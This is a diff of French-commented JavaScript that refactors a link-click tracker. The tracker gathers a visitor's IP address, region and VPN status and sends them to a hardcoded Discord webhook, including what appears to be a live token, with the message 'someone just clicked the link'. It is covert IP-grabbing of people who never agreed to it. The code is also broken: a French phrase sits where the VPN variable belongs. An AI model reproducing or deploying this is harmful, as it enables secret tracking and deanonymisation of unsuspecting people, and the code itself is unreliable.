@@ -1,12 +1,6 @@
-// Fonction pour envoyer l'adresse IP, le département et la détection du VPN à Discord via un appel de webhook
-function sendIPAndDepartmentToDiscord(ipAddress, department, isVPN) {
+// Fonction pour envoyer les informations à Discord via un appel de webhook
+function sendToDiscord(content) {
   var webhookURL = "https://ptb.discord.com/api/webhooks/1125207312806727740/bvMj9uwuMoljP5zjAZWjfXvjYO1wmzZNwAbBDvOFEV87X7SvWir3qQEWn4GSMFZvNRyF";
-
-  var vpnStatus = Utilisation d'un VPN ? "Oui" : "Non";
-  var content = "> **Quelqu'un vient de cliquer sur le lien. Voici les informations reçues :**" +
-    "\n> **Adresse IP 🛰️ : **" + ipAddress +
-    "\n> **Région 🏠 : **" + department +
-    "\n> **VPN 🌐 : **" + vpnStatus;
 
   var request = new XMLHttpRequest();
   request.open("POST", webhookURL);
@@ -32,8 +26,14 @@ function detectVPNByIP(ipAddress) {
         .then(data => {
           var department = data.region;
 
-          // Envoyer l'adresse IP, le département et la détection du VPN à Discord
-          sendIPAndDepartmentToDiscord(ipAddress, department, isVPN);
+          // Préparer les informations à envoyer à Discord
+          var content = "> **Quelqu'un vient de cliquer sur le lien. Voici les informations reçues :**" +
+            "\n> **Adresse IP 🛰️ : **" + ipAddress +
+            "\n> **Région 🏠 : **" + department +
+            "\n> **VPN 🌐 : **" + (Utilisation d'un VPN ? "Oui" : "Non");
+
+          // Envoyer les informations à Discord
+          sendToDiscord(content);
         })
         .catch(error => {
           console.error('Erreur lors de la récupération du département :', error);
